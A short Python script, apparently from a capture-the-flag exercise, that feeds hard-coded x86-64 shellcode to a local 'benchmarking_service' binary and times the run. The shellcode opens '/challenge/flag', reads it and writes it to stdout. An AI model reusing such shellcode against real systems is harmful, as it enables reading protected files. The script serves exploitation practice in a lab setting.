import subprocess
import time
import sys

if __name__=="__main__":
    sys.stdout.write("======= BENCHMARKING SERVICE V1.0 =======\n")
    sys.stdout.flush()
    shellcode = b"\x48\xC7\xC0\x02\x00\x00\x00\x48\x31\xF6\x48\x31\xD2\x48\xBB\x67\x65\x2F\x66\x6C\x61\x67\x00\x53\x48\xBB\x2F\x63\x68\x61\x6C\x6C\x65\x6E\x53\x48\x89\xE7\x0F\x05\x48\x89\xFE\x48\x89\xC7\x48\x31\xC0\x48\xC7\xC2\x00\x01\x00\x00\x0F\x05\x48\xC7\xC0\x01\x00\x00\x00\x48\xC7\xC7\x01\x00\x00\x00\x0F\x05"
    sys.stdout.write(f"Shellcode: {shellcode}\n")
    sys.stdout.flush()
    sys.stdout.write("Testing the performance of your shellcode...\n")
    sys.stdout.flush()
    start = time.time()
    p = subprocess.run(['./benchmarking_service'], input=shellcode, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    end = time.time()
    delta = end - start
    sys.stdout.write("Time: %s\n" % delta)
    sys.stdout.flush()